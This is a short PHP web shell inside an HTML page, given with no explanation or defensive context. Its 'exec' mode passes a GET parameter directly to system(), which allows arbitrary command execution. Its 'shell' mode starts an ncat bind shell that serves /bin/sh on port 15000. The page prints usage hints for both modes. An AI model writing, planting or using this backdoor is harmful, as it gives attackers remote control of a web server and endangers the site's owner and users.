<html>
<head>
</head>
<body>
	
	<?php


		$port= $_GET["port"];
		#$host = $_GET["host"];
		$fun = $_GET["fun"];
		$cmd = $_GET["cmd"];

		
		if ( isset($_GET['fun'] ) ) {
			if ( $fun == "shell" ) {
		
				if ( isset($_GET['port'] )  )  {
					echo 'faaag';
					#echo 'ncat -w 5s -l -p '. $port .' -e /bin/sh';
					#exec('ncat -w 5s -l -p '.$port.' -e /bin/sh');
				}else{
					exec('ncat -w 5s -l -p 15000 -e /bin/sh');
				}
			}	
			if ($fun == "exec") {
				if (isset($_GET['cmd'] )  ) {
					system($cmd);
				}else{
					echo 'specify cmd=';
				}
			}

		}else{
			echo '?fun=shell&port=xxx<br>';
			echo '?fun=exec&cmd=xxxxxxx';
		
		}

		
	



	?>
</body>

</html>

